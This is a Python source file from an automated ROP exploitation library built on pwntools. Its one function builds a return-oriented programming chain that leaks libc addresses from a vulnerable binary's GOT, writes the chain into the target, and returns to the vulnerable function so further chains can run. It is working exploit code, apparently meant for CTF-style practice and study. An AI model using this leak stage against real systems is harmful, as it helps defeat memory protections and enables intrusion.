from autorop import PwnState, arutil, constants
from pwn import ROP, log
from typing import List, Callable


def leak_helper(
    state: PwnState,
    leaker: Callable[[ROP, int], ROP],
    symbols: List[str],
    offset: int = 0,
) -> PwnState:
    """Leak libc addresses using a leaking function.

    This function leaks the libc addresses of ``symbols``
    using rop chain built by ``leaker``, placing them in ``state.leaks``.
    ``leaker`` msut separate leaks using newlines.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``overwriter``: Function which writes rop chain to the "right place".
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.

        leaker: function which reads arbitrary memory, newline terminated.
        symbols: what libc symbols we need to leak.
        offset: offset, in bytes, from the start of the GOT address of each symbol
                at which to begin leak, treating previous bytes as zeroes
                (this is helpful if the leaker function terminates on a zero byte)

    Returns:
        Mutated ``PwnState``, with the following updated

            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    assert state._elf is not None
    rop = ROP(state._elf)
    for symbol in symbols:
        rop = leaker(rop, state._elf.got[symbol] + offset)

    # return back so we can execute more chains later
    arutil.align_call(rop, state.vuln_function, [])
    log.info(rop.dump())

    state.target.clean(constants.CLEAN_TIME)
    state.overwriter(state.target, rop.chain())

    for symbol in symbols:
        line = state.target.readline()
        log.debug(line.hex())
        # remove last character which must be newline
        state.leaks[symbol] = arutil.addressify(line[:-1]) << (8 * offset)
        log.info(f"leaked {symbol} @ " + hex(state.leaks[symbol]))

        # TODO: make this a bit less hacky maybe
        # try leaking next bytes if we happen to stumble upon a zero byte
        if state.leaks[symbol] == 0x0:  # unluckily the address has a zero at start
            return leak_helper(state, leaker, [symbol], offset + 1)

    return state
